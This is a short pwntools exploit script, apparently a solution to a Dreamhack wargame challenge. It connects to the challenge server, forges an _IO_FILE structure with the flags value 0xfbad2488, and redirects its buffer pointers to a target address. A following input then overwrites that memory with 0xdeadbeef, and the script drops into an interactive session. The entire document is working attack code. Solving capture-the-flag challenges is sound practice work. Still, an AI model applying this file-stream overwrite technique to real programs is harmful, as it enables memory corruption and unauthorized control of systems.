from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 15378
r = remote(HOST, PORT)

overwrite_me = 0x6014a0

payload = flat([
    0xfbad2488,
    0,0,0,0,0,0,
    overwrite_me,
    overwrite_me+0x400,
    0,0,0,0,0,
    0
])
r.sendlineafter(b'Data: ', payload)
r.sendline(p64(0xdeadbeef) + b'\x00'*0x400)

r.interactive()